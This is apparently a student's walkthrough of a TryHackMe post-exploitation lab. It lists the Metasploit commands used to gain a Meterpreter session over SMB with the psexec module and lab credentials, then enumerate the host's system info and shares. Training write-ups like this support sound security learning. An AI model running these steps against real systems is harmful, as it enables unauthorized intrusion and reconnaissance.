*** Post-Exploitation Challenge ***

> After launching the THM AttackBox, i then went ahead and launch Metasploit by inputting the commnad "msfconsole," then "enter."

> I then had to use the credentials, username: "ballen," and password: "Password1" to simulate an initial compromise over SMB using exploit module "exploit/windows/smb/psexec." To do this i first inputted the
command "search exploit/windows/smb/psexec," then "enter," then "use 0," then "enter" again.

> I then inputted the command "show options" to check to see if RHOSTS was set and it wasnt so i inputted the command "set RHOSTS 10.201.121.54," then "enter," then "show options" to confirm that it was set.

> I then had to set the SMBUser & SMBPass to carry out the compromise. To do this i inputted the command "set smbpass Password1," then "enter," then set smbuser "ballen," then "enter," then "show options" to
confirm that everything was set correctly.

> I then inputted the command "run" to carry out the exploit and start the Meterpreter session.

> Moving on to the practical questions, my first exercise was to figure out the "computer name." To do this i inputted the command "sysinfo," then "enter." This displayed the "computer name" as "ACME-TEST."

> I then had to figure out the "target domain" which was also within the sysinfo. The "target domain" was "FLASH."

> I then had to figure out the name of the share created by the user. To do this first had to background the Meterpreter session by using the command "background," then "enter"

> Then i search for the "enum shares" module by inputting the command "search enum_shares," then "enter," then "use 0," then "enter," then "show options" to check if everything was fill in and saw that the
"SESSION" option was blank so i inputted the command "set SESSION 1," then "enter" because that was the Meterpreter session we were running on. After setting the SESSION option i inputted "run," then "enter,"
and got the enum_share of "speedster."
